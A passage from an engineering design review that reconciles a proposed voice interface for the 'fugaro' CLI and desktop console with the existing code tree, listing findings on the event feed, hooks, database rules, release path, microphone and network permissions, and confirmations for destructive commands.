Spawning the **helper** hands the console a process whose agent runs under the operator's own identity and can run `fugaro cancel`, `fugaro budget kill` and `gh pr merge` itself — the app's argv table fences what the **app** passes to it and nothing the **agent** decides to do — so D54 (the helper's permission callbacks) is a fifth load-bearing decision, and "the only writing process is the child the app spawns" describes the write rather than fencing it.

## 1. Findings

Each finding is classified **Exists** (the tree has it, and the spec should be read as naming it), **Wrong** (the spec, or a document in this tree, says something the code contradicts), **Gap** (nothing in the tree does it), **Rule** (not a fact but a constraint the tree's existing decisions impose on how the feature may be built), or **Open** (a question this document cannot answer from the tree alone).

### The substrate that exists

**F1 — the tree already runs Claude Code headless and already parses its stream-json. (Exists)**

The spec's "`claude -p` with `--input-format stream-json --output-format stream-json`" has a working precedent in Go, one layer down from where the spec wants it. `internal/agent/agent.go` opens with *"Package agent runs Claude Code headless (`claude -p`) for one stage"*, and its `Args(req Request) []string` builds the argument vector `-p --output-format stream-json --verbose --dangerously-skip-permissions`, then appends the per-stage flags (`--resume`/`--session-id`, `--append-system-prompt`, `--model`, `--max-budget-usd`, `--json-schema`). The stream is parsed by `ParseStream(r io.Reader, transcript io.Writer) (res Result, found bool, err error)` in `internal/agent/stream.go`, relayed live by `Relay` (`internal/agent/relay.go`), and scrubbed of secret values by `Redactor`/`NewRedactor`/`Redact` (`internal/agent/redact.go`).

**What that precedent is, and what it is not.** It runs **inside a cloud container, for one run stage, for the duration of a stage, with `--dangerously-skip-permissions`**, driven by the runner and never by a laptop process. It has no `--input-format` flag at all — `Args` writes none — so the spec's "user turns go in as structured messages" is the half that does not exist here: this tree sends **one prompt per stage** and reads the stream out. So the spec's bridge is not greenfield (the argv, the parser and the redactor are written and tested), but the interactive half of it is.

**F2 — the task-event feed is already a documented contract, and it is a document rather than a subscription. (Exists)**

`fugaro watch --json` emits one compact JSON document per change (`internal/cli/watch.go`'s `newWatchCmd` owns the flags; `internal/watch/json.go`'s `BuildJSON(project string, v View) JSONDoc` is the single constructor), and the console's own contract document on `main` — `console/docs/json-contract.md` — writes every field of every shape down, derived from the structs themselves by `internal/cli/docs_desktop_console_test.go`'s `TestDocsDesktopConsoleContractNamesEveryWatchField` so a rename in `json.go` fails a test rather than a screen.

**That document is where the Event Digester's substrate already is.** `console/docs/json-contract.md` §10 ("What `watch --json` guarantees to a long-lived child process") settles, on `main`, the thirteen facts a consumer of a long-lived feed actually needs: one document per change on a one-second floor (§10.1), the first document's latency (§10.2), that a slow reader blocks the child rather than losing a document (§10.3), that a closed stdout ends the child (§10.4), that a refused read is terminal (§10.5), that a withdrawn stream is not an exit (§10.6), that UTC midnight is a gap rather than a zero (§10.7), that the no-Firebase mode is a second shape and one of its lines is not JSON (§10.8), the thresholds (§10.9), the documents per minute in each mode (§10.10), how the child ends when the console asks it to (§10.12), and the two that decide this feature's shape — **§10.11: "Does option A need a supervisor process? Yes"** and **§10.13's reader rules**, which are what a voice reader that stays alive for as long as the app is listening has to obey (F10).

**F3 — the severity inputs the digest needs are already fields, including the two the spec names by hand. (Exists)**

The spec's `important` mode interrupts for "failures, budget-cap warnings, kill-switch events, and anything awaiting user input". Three of the four are fields on `main`:

- **kill-switch events**: `internal/watch/json.go`'s `JSONKill{By, At, Reason string}` sits on `JSONTotal.Kill` and `JSONRepo.Kill` (`*JSONKill`), built by `jsonKill(k KillState) *JSONKill` — so a kill carries **who, when and why**, and the console's design already draws it (`desktop-console.md` §6.2's Live screen row).
- **budget-cap warnings**: `JSONTotal.Percent` and `JSONRepo.Percent` (`*float64`) are the fraction of the day's cap already counted, and `JSONBurn{Known bool, USDPerMin float64, FastAlert bool}` (`json:"usd_per_min"`, `json:"fast"`) is the burn rate with the alert flag `watch` already computes. What does **not** exist is a "cap is near" *threshold*: the tree's one alert is a **rate** (`internal/localcfg/localcfg.go`'s `BurnAlert()` reading `watch.burn_alert_usd_per_hour`, passed into `watch.Config{BurnAlertPerHour: …}` from `internal/cli/watch.go`), not a fraction — the console v2 reconciliation reached the same conclusion (its F29 and D35), and it applies here unchanged.
- **failures**: `JSONFinished{Failed bool, Status, Outcome string}` (`Status` is "the runstore status: succeeded, failed, halted, cancelled, infra_error").

**The fourth — "anything awaiting user input" — has no state anywhere in this tree.** Nothing carries it, nothing computes it, and no word for it exists in any shape. The nearest facts are a run's `Halted string` (`omitempty`) and the launcher's claim (`internal/runstore/launch.go`'s `Claim`, `ClaimKey`, `ClaimTTL`), neither of which means "a person is being asked something". The console v2 reconciliation found the same hole for its status dots (its F4). **A digest may only colour what a document carries** — the same rule the console's §5.1 rule 2 states for `pr_url` — so `important`'s fourth trigger is a **Gap** and cannot be spoken until something defines it.

**F4 — the console's data plane is designed, half-built, and documented on `main`. (Exists)**

`console/README.md` and `console/docs/json-contract.md` are merged, the Go/console boundary is held by three named tests in `internal/cli/docs_console_boundary_test.go` (`TestConsoleIsOutsideTheGoModule`, `TestGoModHasNoConsoleDependency`, `TestNoGoFileEmbedsFromConsole`), and the console plan's phase 0 — the JSON contract, the child-process contract and the boundary — **is merged on `main`**: `c89a995` (Task 0.1, #406), `4578889` (Task 0.2, #412) and `d06d1c3` (Task 0.3, #420), which is where `console/README.md`, `console/docs/json-contract.md` and the boundary tests come from. The merge is the evidence and the plan's own header is not: it still reads *"No code in this plan has been written or run"* and *"Tasks 0.1 onward are future work"*, which was true when it was written and is stale for phase 0 — an earlier revision of this finding cited that header for the fact instead of the commits. `FugaroSource` itself is `desktop-console.md` §8.3's interface: it "yields `JSONDoc`-shaped snapshots and emits change events, and it knows nothing about how they were produced", with a `cli` implementation (spawn) and a `fixture` implementation (replay recorded NDJSON). **This is the thing the Event Digester should sit on**, and it is the reason that half of the spec is cheap.

**F5 — the shipped Claude Code plugin is skills-only, and registers no hooks. (Exists)**

`plugin/.claude-plugin/plugin.json` declares exactly `name`, `version` (`0.7.5`), `description`, `author`, `repository` and `license` — **there is no `hooks` key, no `commands` key, no `mcpServers` key**, and the marketplace entry (`.claude-plugin/marketplace.json`, `"source": "./plugin"`) carries no version. The five skills are `plugin/skills/{parallelism,routing,setup,upgrade,working}/SKILL.md`. The skills linter enforces the shape: `plugin/skills_lint_test.go`'s `TestLintFrontmatterAllowsOnlyNameAndDescription` loops over **five** extras — `allowed-tools: Bash`, `hooks: {}`, `shell: bash`, `disable-model-invocation: true` and `model: opus` — and expects the violation *"frontmatter allows only name and description"* for each, with the comment that "a key such as allowed-tools or hooks would give the skill powers; none is allowed".

**The tree does not merely lack hooks — it treats them as a hazard it warns about.** `internal/pluginwire/notices.go`'s `settingsNotices` emits, at a checkout settings file's `hooks` key, the line *"the file defines hooks: commands that run on every teammate's machine when Claude Code starts or uses a tool"*, and `docs/gcp-setup.md` records the same list as `heads-up` lines on `init`'s plugin stage. The wiring `fugaro init` writes is two keys and nothing else (`internal/pluginwire/wire.go`'s `Snippet`: `extraKnownMarketplaces` and `enabledPlugins`). `internal/agent/settings.go`'s `RoutingKeys` and `SettingsFiles` inspect those files for keys that would reroute Claude Code.

**So the spec's hooks bridge starts from zero here, in a tree whose posture is that hooks are something to flag.** That is the finding, and it is a **Rule** for the bridge (§D41) rather than merely a gap.

**F6 — the realtime-database rules are generated, tested, and deployed by the owner alone. (Exists)**

The rules are a Go template with a golden file and two independent test layers: `internal/budget/rules/rules.json.tmpl` is embedded by `internal/budget/rules/rules.go` (`//go:embed rules.json.tmpl`, `Generate() ([]byte, error)`), pinned by `TestRulesGolden` and `TestGeneratedRulesParse` (`rules_test.go`), mirrored in Go by `TestRulesParity` (`parity_test.go`), and exercised against the real Firebase emulator by `emulator_test.go`, `lease_emulator_test.go` and `harness_test.go` under the `firebase` build tag (the pinned `firebase-tools` `15.19.0`, `private: true`, `engines.node >= 20`, in `internal/budget/rules/emulator/package.json`). They reach a database **only** through the owner: `docs/gcp-setup.md`'s "Deploying the rules is an owner step" says they are the last write of `fugaro init --firebase`'s database step, behind a confirmation that lists each write.

**F7 — there is no npm publishing path, and every Node package here is private. (Exists)**

`scripts/release.sh`, `scripts/release-gate.sh`, `scripts/release-policy.sh`, `.goreleaser.yaml` and the three workflows (`.github/workflows/release.yml`, `images.yml`, `ci.yml`) contain no npm/jsr publish step; `docs/release.md` documents GoReleaser binaries, per-archive SBOMs, a keyless cosign signature of `checksums.txt`, the GitHub Release, a Homebrew cask and `ghcr.io` images, and nothing else. Every Node project in the tree declares `"private": true` and an unscoped name — `fugarosandbox` (`deploy/sandbox`), `fugaro-base-harnesses` (`images/base/harnesses`), `fugaro-rules-emulator` (`internal/budget/rules/emulator`) — and the three under `plugin/testdata/` are fixtures. CI's npm use is two steps and neither publishes: it pins npm to the version that wrote the lockfile (`npm install --global npm@11.19.0`) and then runs a **real dependency install** — `npm ci --ignore-scripts --no-audit --no-fund` in `internal/budget/rules/emulator`, which is how the pinned `firebase-tools` the rules emulator needs arrives (`.github/workflows/ci.yml`). An earlier revision of this finding called the npm pin the tree's only npm use, which understated what a console test job would be adding.

**F8 — the console is read-only by exact-argument allow-list, and that is the whole fence. (Exists / Rule)**

The owner answered D1 ("CLI sidecar (option A) … direct RTDB/Firestore access with the operator's credentials (option B) never"), D2 ("strictly read-only"), D4, D11 and D14 on 2026-10-15; the design states the invariants as §3.4's eight rules, §4.2's explicit exclusions and §5.1's ten hard rules; and the plan restates them as Global Constraints 1–10, of which 2 ("No credential is ever read, held or stored by the app"), 3 ("The app never writes") and 4 ("The renderer … gets no network") are the three this spec presses on hardest. D14's answer is the load-bearing one: *"Treat every identity as a possible admin, and give the read-only guarantee to the allow-list alone."* An allow-list over argument vectors can say "this app may run `fugaro runs ls --json` and nothing else"; it cannot say "this app may write this one database path", because an app that can write one path holds a credential that can write all of them.

**F9 — the project's data-egress control exists, and it is about model providers only. (Exists / Rule)**

`allow_data_to` is a real, enforced config key: `config.ModelProvider.AllowDataTo []string` (`internal/config/providers.go`) is the list of `<owner>/<repo>` whose code may be sent to that provider, validated by **`config.ValidateModelProviders`** (`internal/config/providers.go`) — which is called from `internal/localcfg/localcfg.go`'s local-config validation and from `internal/runner/providers.go`'s provider-environment decode, the only two callers outside `internal/config` itself — mounted per repository by `fugaro init --repo`, and refused at run time by the runner's provider-model check. **An earlier revision attributed the validation to four CLI files (`internal/cli/init.go`, `internal/cli/initsecrets.go`, `internal/cli/doctor.go` and `internal/cli/accounts.go`), which is wrong**: none of them calls the validator. `internal/cli/initsecrets.go`'s and `internal/cli/accounts.go`'s `allow_data_to` is **`ClaudeAccount.AllowDataTo`**, a different key with its own validator, and `internal/cli/secrets.go` reads a provider's list to decide where a key may be stored rather than to validate it. `docs/multi-model.md` and `README.md` state the semantics: absent or `["*"]` means every repository, `[]` is refused as ambiguous, and a real list is the opt-in. **It governs model providers and the OAuth accounts and project secrets that ride with them — nothing else.** Voice's STT/TTS providers are not model providers, so no existing key covers them (F23).

**F10 — the console's one long-lived reader already needs a supervisor, and the contract says so. (Exists)**

`console/docs/json-contract.md` §10.11 answers its own section's last question — *"Does option A need a supervisor process? Yes"* — and §10.13 states the reader rules that follow. This matters here because the voice feature keeps that reader alive for as long as the app is listening, which is longer than any screen is open.

### Where the spec and this tree disagree

**F11 — the Event Digester's source, as written, is Option B and a node name that does not exist. (Wrong)**

The spec's §4.2: *"The `EventDigester` subscribes to the Fugaro RTDB agents/jobs nodes directly (the same source as `fugaro watch`)."* Two things are wrong with one sentence.

**The node name.** There is no `agents/jobs` path. The registry is **`/agents/<slug>/<run>`** — `internal/budget/model.go`'s `PathAgent` and `AgentEntry`, written through `internal/budget/registry.go`'s `Session` (`Start`, `Update`, `Finish`) and leased in `internal/budget/lease.go` — and `watch` does not subscribe to that node alone. The console design's §2.2 table is the authority: `watch` reads **four** realtime-database streams (`spend/<day>/global`, `spend/<day>/repos/<slug>`, `agents/<slug>/<run>` and one more), the `config/*` cap and kill nodes, and — the part the spec's sentence misses entirely — **it also scans the runs bucket** (`internal/cli/watch_queued.go`'s `openQueueBucket` — "opens just the runs bucket, never the compute backend" — and its `queuedScanner`, whose `scan` **method** and the **package-level** `scanRun` it holds as its `readRun` hook (the scanner's own field, so the tests can slow it down) read `task.json`, `launch.json`, `result.json`, the launch claim and the cancel marker), which is where the queued/claiming runs and the finished-in-24-hours list come from and which no realtime-database subscription can produce. "The same source as `fugaro watch`" is therefore not a node; it is a program.

**The architecture.** "The console subscribes to RTDB directly" is **Option B**, the design's §3.2, which D1's answer forbids in terms: *"direct RTDB/Firestore access with the operator's credentials (option B) never."* Its disqualifier is written down — it "puts a cloud credential inside a Chromium process whose entire purpose is to render untrusted, job-written strings" — and the design adds, for anyone building a viewer on a Firebase token instead of the operator's credentials, that `/outcomes/**` carries **no `.read` at all**, so a token-based reader would silently see nothing. The spec's own second sentence makes the same mistake for the same reason: the events it wants are *already* a document (F2), and re-deriving them from the database is a second reader of data the CLI already reads, which is exactly what the console's Global Constraint 1 forbids ("No new backend, ever … If a screen needs a field no `--json` emits, the fix is a CLI task in a CLI plan, not a console reader").

**F12 — the orchestrated session is not a Fugaro run, and the spec names two different hosts in one sentence. (Wrong)**

The spec's §1 calls the thing you talk to "the Fugaro orchestrating agent (a Claude Code session)", and its §9 says "The agent keeps running on the laptop or in the cloud; the phone is a thin client". A **Fugaro run** is a cloud container per run, launched under a claim (`internal/runstore/launch.go`'s `Claim`/`ClaimKey`/`ClaimTTL`), ended by a pull request, and — as the console v2 reconciliation established (its F14) — it is *not* an orchestrator: the registry that exists, `/agents/<slug>/<run>`, is "written by a running job about itself, keyed by run, and it stops when the run stops", and an orchestrating agent "has no container, no Cloud Run job, no slug binding and no budget token". So "the agent keeps running in the cloud" is a category error — the thing the spec wants to attach to is a **Claude Code session**, which is not a Fugaro construct at all, and which this repository never runs interactively: its only `claude` invocation is `internal/agent/agent.go`'s `Args`, headless, one stage, in a container (F1).

**The consequence is not pedantic, because it decides the bridge.** The interactive session the spec wants to attach to *already exists* — it is the session the owner is running right now, in a terminal, on the laptop — and it is the only one. Nothing in this tree creates or registers it, nothing can enumerate it, and no identity for it exists (F19). The bridge therefore has to answer "attach to the owner's real session, or start a new one", and the spec answers it both ways: §4.1's hooks bridge attaches, §4.1's SDK bridge starts.

**F13 — `@fugaro/voice` is not a package this repository can publish, and `fugaro voice` is not a command it can ship for free. (Wrong / Gap)**

The spec's §1 makes the standalone module a deliverable ("It is built as a standalone module (`@fugaro/voice`)"), §11 phase 2 extracts it, and §11 phase 2 also wants "a small CLI (`fugaro voice`) to start it".

**The scope is not ours.** Every Node package in this repository is unscoped and `private: true` (F7); `@fugaro/voice` would be a claim on an npm scope the repository does not own, published through a publishing path that does not exist. `docs/release.md`'s rule is that **one `vX.Y.Z` tag releases everything** — the GoReleaser binaries, the base images, the Terraform modules at the tag, the schemas at the tag and the plugin — and the console is already the one artifact that stretches that rule (D11: "its own artifact, published from the CLI's own `vX.Y.Z` tag"). A second registry is a third release stream with a third trust story.

**The CLI half is a Go change.** `fugaro`'s command list (`internal/cli/root.go`) is a fixed set with no `voice` in it, and every one of the console design's §4.3 gaps is "a separate CLI PR in a CLI plan — none of them blocks v1" (D19). Adding `fugaro voice` is exactly that: a CLI command, in a CLI plan, subject to the CLI's own confirmations, its own release train and the `console`-vs-Go boundary. It is not console work and it is not free.

**F14 — "Claude Code's voice input requires holding a key to talk" is a claim about a tool outside this tree. (Open)**

This repository pins nothing about Claude Code's interactive input affordances. The one Claude Code integration the tree owns is headless (`internal/agent/agent.go`) and the one plugin it ships is skills-only (F5). The sentence may be true; it cannot be checked here, and nothing in the plan depends on it. Recorded rather than ruled on.

### The gaps

**F15 — there is no audio anywhere in the tree. (Gap)**

No capture, no decode, no play, no stream, no device enumeration, no sample rate, no codec. On `origin/main` at `a573870` — the baseline §0 states — the word "voice" appears **once** in `docs/`, and it means a writing style (`docs/plans/2026-10-14-oauth-reviewer-stage.md`'s "in the list's own voice"); case-insensitively the only other hit is a substring inside an unrelated word ("invoice" in `docs/gcp-live-checklist.md`). **That is a statement about the baseline and not about the tree this pair merges into**, where three documents about a voice interface use the word throughout; the finding is about the code, and the code side is unaffected. Two of the spec's seven components (`AudioIn`, `TextToSpeech`) and both provider interfaces (`SpeechToText`, `TextToSpeech`) are greenfield, and so is echo cancellation and VAD.

**F16 — there is no `fugaro voice`, and no local socket to forward anything over. (Gap)**

The spec's hooks bridge forwards "to the voice process over a local socket". Nothing in this tree listens on one: the CLI's only long-lived output is `fugaro watch --json` **on stdout**, and the console's `FugaroSource` reads exactly that (F2, F10). The console itself opens no listening port either — that is precisely why the design rejected Option C (`fugaro console serve --listen 127.0.0.1:<port>`) for v1 ("it adds a listening socket to the CLI, which is a new attack surface for a program that today only makes outbound calls"), designing it only so it can be a drop-in later. A local socket for the voice process is that same new attack surface, and it is a decision (§D41, §D50) rather than plumbing.

**F17 — no orchestrating session has an identity, a registry or a claim. (Gap)**

The spec's §9 needs a `voice/sessions/{id}`, and its §4.1 needs sessions to exist at all. What exists is `/agents/<slug>/<run>` (F11), keyed by run and written by the run. The per-run identity the tree mints — a Firebase custom token whose claims are `{fs: <slug>, fr: <run-id>, fx: <expiry in ms>}`, signed through IAM `signJwt` by a signer account that holds no roles, described in `docs/design/m9-budget-and-dashboard.md` §6.4 and exchanged at bootstrap for an ID token — is exactly what a session would need and exactly what a session does not have, because a launcher mints it for a job, and the token is bound to that job's slug and run id. A session registry is **new identity work**; this is the console v2 reconciliation's finding too (its F14, D24), and it is unchanged by the voice spec.

**F18 — there is no microphone permission, and the design denies it on purpose. (Gap / Rule)**

`desktop-console.md` §5.1 rule 9: *"Deny every web permission. `session.setPermissionRequestHandler` refuses camera, microphone, geolocation, notifications, clipboard-read, everything. No permission is ever granted."* The spec's §5 ("Always-on listening once the session is started; no key held") is the first feature that needs one. This is a **Rule** as well as a gap: turning it on is a §5.1 hard-rule change, not a settings toggle.

**F19 — the renderer has no network, and cloud STT/TTS is a network connection. (Gap / Rule)**

`desktop-console.md` §5.1 rule 3: the CSP is `default-src 'none'; … connect-src 'none'; …`, and *"**`connect-src 'none'` is the important one**: the renderer never talks to the network, because every byte arrives over IPC."* Rule 2 is stronger still: *"No remote content, ever."* The spec's §5 and §6 put streaming audio and streaming text through providers that are, by default, **cloud** services (§13's open question is literally "cloud streaming vs local"), and the spec's §9 says the phone-side STT/TTS are on the phone while the console's would not be.

Audio to a cloud provider is an outbound connection the console design's app does not make. The design is careful about *whose* connection it is — §5.1 rule 3's last sentence: *"The console's only network traffic is the CLI child process's — an outbound call the CLI already makes and the app never sees"* — and §7.4's promise is "your machine stays your business". A cloud STT is neither.

**F20 — there is no summarizer and no model-call path from the console. (Gap)**

The spec's §6 summarization is "a model call the console makes" in every implementation: the console spawns read-only `fugaro` commands (`desktop-console.md` §5.1 rule 6's exact-argv table) and holds no credential (Global Constraint 2). Nothing in the tree summarizes anything for a human; the closest machinery is `internal/agent`'s headless stage runner, which is a *writer* of work, not a condenser of it, and it runs in a container.

**F21 — there is no config surface for voice, and no place for a provider key. (Gap)**

The console's settings are D13's installation tuples (a project name, a config path, a binary path and an optional checkout directory — "stores the tuples, never a credential") and D20's opt-in spawn log. There is no keychain integration, no per-user settings document beyond that, and — importantly — the spec's §10 chooses the right home for the *preferences* ("Lives in the console's local settings (per user), not in project config") while saying nothing about where the *credentials* live. That is the gap.

**F22 — destructive voice commands have no substrate, and the confirmation shape the spec asks for does not exist here. (Gap / Rule)**

The spec's §8: "Destructive actions (kill switch, cancel jobs, merge) issued by voice go to the agent as normal, but the controller requires a spoken read-back confirmation before the agent executes them."

The acts are **not all confirmed the same way**, and the difference is load-bearing for D47. **The budget writes are**: `internal/cli/budget.go`'s `confirmTyped` prints what is about to happen and makes the operator type the project's name at a terminal (or pass `--yes`), and its three callers are the cap **raise**, `budget kill` and `budget resume`; the write itself goes through `internal/budget/kill.go`'s `SetKill`, with its `Confirm` hook and its read-again retry when the database changed underneath; and the refusal for someone who is not an admin is `AdminDeniedText` — *"you are not a budget admin for project X: only the GCP project's owners and editors and terraform.budget_admins may change caps and kill switches…"*. `fugaro init`'s applies require the project's name typed too (`internal/cli/init.go`: *"Type <project> to confirm:"*). **`fugaro cancel RUN` has no confirmation at all**: `internal/cli/cancel.go`'s `newCancelCmd` validates its flags and calls `cancelRun` directly, its flags are `--grace`, `--now`, `--json`, `--finalize-wait`, `--poll` and the test-only `--grace-floor` — no `--yes`, no `--force`, no prompt, no read of stdin — and the `cancelResult` an earlier revision cited for it is the plain result struct the command prints. `merge` is not a Fugaro verb at all, so it has no Fugaro confirmation either. **An earlier revision of this finding said `fugaro cancel` "has its own confirmation" and cited `cancelResult` as it; that was wrong, and it is the kind of wrong a task can be built on**, because D47's recommendation leans on confirmations that exist for the budget acts and do not exist for cancel. **There is no read-back anywhere, and no speech anywhere to read back with.**

The Rule is the interesting half: a spoken confirmation is only worth having if satisfying it is a *different act* from issuing the command, and if the same misrecognition cannot produce both. A system that asks "did you say *cancel run fugarosandbox-7*?" and accepts "yes" has a confirmation whose failure mode is the failure mode it was built to catch. §2's D47 is where that is costed — and it is only the console's own commands it costs: the agent-side path to the same acts is **F38**'s, and no confirmation of the controller's stands in front of it.

**F23 — the providers the spec needs are not covered by any existing data-egress control. (Gap)**

`allow_data_to` covers model providers (F9). The spec's `stt.provider`, `tts.provider` and `summarizer.model` are none of them (unless the summarizer is routed through a Fugaro-configured provider, which the spec does not say). So there is no `allow_data_to`-shaped answer to "may this repository's *conversation* go to Deepgram", because the unit is wrong twice: the thing being sent is not source code, and it is not a repository's code but the operator's own speech and the agent's own replies about a **project**. The project-level analogue does not exist.

**F24 — the acceptance criteria have no test substrate, and which of the six can be tested is settled here, once. (Gap)**

The spec's §12 asserts six things. **This table is the single mapping of all six** — D52 refers to it rather than restating it, because an earlier revision of this document classified them twice and disagreed with itself about the ~300 ms barge-in budget, and because the mapping is a fact about the criteria rather than an opinion belonging to a decision:

| # | §12 criterion | How it is asserted | Where |
|---|---|---|---|
| 1 | A full 30-minute session with 20+ concurrent tasks, no keyboard | **Owner-run only.** A real microphone, a real speaker, a real provider and real concurrency; nothing about it is asserted in CI. | Check 64, step 3 |
| 2 | No task-status message spoken inline unless the interrupt policy allows it | **CI.** A pure function of a digest and the policy: a `quiet` fixture containing a failure and a kill must speak **nothing**. | V2.2 |
| 3 | Spoken replies average ≤ 15 s; the full reply always on screen | **CI**, against a fake model and a recorded feed. The **provider's own** latency is not asserted there — it is measured in the owner-run bake-off (D46, U3). | V3.1 |
| 4 | Pauses of up to ~1.5 s mid-sentence don't end the user's turn | **CI.** The turn detector on scripted frames: a 1.5 s mid-sentence pause and an 800 ms tail. | V4.1 |
| 5 | Speaking over the assistant stops playback within ~300 ms | **CI, for the half that is ours.** The cancellation is a **controller state-machine property** against a fake player (V5.1, V6.1); the real device latency is owner-run (Check 64, step 3). Calling it purely testable and calling it hardware-bound were each half right. | V5.1, V6.1 |
| 6 | Destructive voice commands always get a spoken confirmation first | **Not a behaviour this plan ships, so not testable as one.** **D47's answer of 2026-10-16 is that none ships in v1**, which defers V6.3, and the agent-side path to `fugaro cancel` and `gh pr merge` is **F38's**, not the controller's — D47's rule never sees it. So **four of the six are CI assertions, one is owner-run only, and one is not yet a behaviour at all** — and the latency numbers (300 ms, 15 s, 1.5 s) are enforced continuously against the fakes rather than only on the owner's machine.

What exists to copy, and it is a lot: **recorded, redacted fixtures** (D6 — "from the sandbox installation and repository only, never `belong`; a fixture that fails the redaction check is not committed"), the console's **eight named fixture cases** (`desktop-console.md` §9.1 lists eight: a normal run, a run that goes **silent then lost**, **a kill switch flipping mid-feed**, **a repository at its cap**, an oauth run, an absent field, a feed gap and a hostile title — **the third and fourth of which are where the digest's severity table is exercised**: a kill flip is the kill class and a repository at its cap is the at-cap class, which are the two severity states the digester has to classify and the interrupt policy has to allow or suppress. The **silent-then-lost** case is not a severity case at all — it is the console's own degraded/availability state, which the digest renders as connectivity rather than as an event to speak — and an earlier revision of this finding named it, wrongly, as the severity substrate; V2.1 and D52 name the kill-flip and at-cap cases, and this sentence now agrees with them), the golden-frame discipline (`internal/watch/render_test.go`'s `golden(t, name, got)` helper and `testdata/<name>.golden`, rewritten deliberately with `-update`), and Playwright + Electron screenshot goldens (§9.3). **No audio fixture exists, and no fake STT/TTS exists** — but the spec's own "each behind an interface so providers can be swapped" is exactly what makes them cheap to add.

### The rules the existing decisions impose

**F25 — the allow-list is the fence, so every write the spec asks for moves the fence. (Rule)**

D14's answer, restated (F8). The spec asks for writes in four places: the phone's `inbox` (§9), the drag-free but still `confirm_destructive` path (§8), "merge" by voice (§8), and — implicitly — whatever the summarizer's "answer simple questions directly from RTDB" would need (§13). Each is a *decision about the fence*, not an implementation detail: if the app can write one path, the allow-list is no longer "the whole fence", and D14's answer is void. The console v2 reconciliation's F9 reached this conclusion for its command queue, and its D21 **recommends** "no, in any slice". **How many of that table's eighteen rows are answered has moved twice since this document was written, and neither state changes anything here.** At #426's merge (`2172d92`, 2026-10-16) three of them carried answers: **D22** ("one write, launch, through `fugaro run` … with no command queue"), **D34** ("not yet"), and **D21 by D22's own words** ("with no command queue" — D21 has no table row, so its answer lives in its paragraph). **#455 (`7628f70`, "docs(console): record the owner's answers to the v2 decisions D21–D38", 2026-10-16) has since answered all eighteen**, and `docs/design/desktop-console-v2.md` on `main` now reads *"all eighteen, on 2026-10-15/16 — none of D21–D38 is still open"*. Those answers are the console v2 work's and they do not answer anything here. **§2 below starts this document's numbering after the range because the range is allocated to that work — D21–D38, by the same owner allocation that gives this work D39–D54 and managed projects D55 onward — and not because rows were open**, which is the reason a numbering decision may not rest on an answer count at all. **Two earlier revisions of this finding are corrected here rather than quietly dropped**: the first said "not one of its eighteen rows carries an owner answer" (true of the draft it was read from), and the second said fifteen of eighteen were unanswered (true at #426's merge, false on `main` since #455).

**F26 — a new realtime-database node is a rules change, and a rules change has a fixed toll. (Rule)**

`desktop-console.md` §4.2 lists, as out of v1's scope *and of the design's remit* (§11): "**A new backend, a new service account, a new RTDB node, a rules change.** This design adds none." If voice ever adds `voice/sessions/{id}`, the toll is the one F6 describes and it is not optional: the template (`rules.json.tmpl`), the golden file, the parity test, the emulator cases under the `firebase` build tag (a JRE, CI-only), **and an owner-run deploy through `fugaro init --firebase`** — with `docs/gcp-setup.md`'s ordering rule (the operator's CLI first, then the deploy, then the runner images) and its warning that this class of change is where a fail-open direction can hide. The project-centric plan already paid this toll once (`docs/design/project-centric.md` §D6's global-per-run fallback, "a fail-open-direction change to security rules … needs an owner-run rules deploy").

**F27 — the app writes nothing, and audio, transcripts and a session store are all writes. (Rule)**

§5.1 rule 10 and D20: "the app writes **nothing** by default: no history, no cache of a document, no crash dump", with the single exception of the opt-in spawn log, which holds "no command output, no environment, no credential, no job-written text and no person" and is "bounded at 1000 records", never read back and never transmitted. A transcript panel that persists, an audio spool for a cloud provider, or a session store are each new stored material in an app whose §7.4 promise is that in the default state "a run of it leaves the machine exactly as it found it".

**F28 — the summarizer is spend the project's budget system does not account for. (Rule)**

The budget machinery is per-run: the caps and counters are realtime-database nodes (`internal/budget/model.go`'s `PathCapsRepo`, `PathSpendGlobal`, `PathSpendRepo`, `PathSpendRun`), the gateway charges a run's calls through a per-run lease (`internal/budget/lease.go`), and `SECURITY.md`'s posture is explicit — *"With the budget gateway on, model keys stay out of the agent's environment"*, and *"the agent's calls go through a per-run gateway … [which] pins the models and charges every call against the caps"*. A console-side summarizer has **no run**, so it has no lease, no cap check and no gateway token; and if it holds a real provider key, it is the exact configuration `SECURITY.md` describes as "Budget mode defaults to off … the real model key sits in the agent's environment like any other secret". What the spec's §13 floats — "the summarizer should also be able to answer simple questions ('how much have we spent today?') directly from RTDB" — would additionally be a second reader of the very counters `fugaro budget show` prints (F11's other half).

**F29 — one tag releases everything, and the console is already the one artifact that stretches it. (Rule)**

`docs/release.md`'s rule, the two workflows it fires and `scripts/release-gate.sh`'s `names="test terraform rules"` are described in `desktop-console.md` §7.1; D11 and D18 move the console to "its own artifact, published from the CLI's own `vX.Y.Z` tag" behind the same gate, with the console check added to the gate's `names` only once it exists on every pull-request head. A voice module adds a *third* artifact unless it ships inside the console's, and the release gate's list is what decides whether a broken voice build can be released.

**F30 — the Go module is untouched and `console/` holds no Go, so `fugaro voice` cannot be smuggled in through the console. (Rule)**

`console/README.md` states it and `internal/cli/docs_console_boundary_test.go` enforces it: no `.go` file, no `go.mod` and no `go.sum` under `console/`, no Go file references a `console/` path, and the boundary test's allow-list has **exactly one** entry (the docs test that reads `console/docs/json-contract.md` as bytes). A `fugaro voice` Go subcommand is a CLI change (F13), and a voice module that needed a Go helper would break this boundary rather than cross it.

**F31 — macOS packaging is owner-run, and the microphone is a new entitlement for an app that was decided to have none it does not use. (Rule)**

D4's answer: "Direct download plus a Homebrew cask; signed, notarised and stapled. Apple signing enters this repository's release path **tag-only**, behind `scripts/release-gate.sh` and a **protected GitHub environment**; **the owner holds the certificate and runs every signing step**." The plan puts the entitlements file in Task 4.1 (SECURITY-SENSITIVE — independent opus review) with the rule, quoted exactly: "**no `com.apple.security.cs.disable-library-validation` unless the pinned Electron genuinely requires it**, and if it does, the reason is a comment in the plist itself; no `get-task-allow` outside a debug build; no entitlement the app does not demonstrably use". A microphone entitlement is one the app *would* demonstrably use — so it is allowed by the rule's letter — but it makes the console an app that asks for the microphone on first run, which changes what the app is (§1's summary: "a graphical `fugaro watch` … holds no credential … Nothing in the console may write to the cloud"). `docs/design/desktop-console.md` §12 item 4 already flags that Electron's current signing requirements are **UNVERIFIED** on this tree; a new `NSMicrophoneUsageDescription` and a hardened-runtime audio entitlement are the same class of fact and need the same owner-run check.

**F32 — a recorded fixture and a redaction check are required before anything recorded is committed. (Rule)**

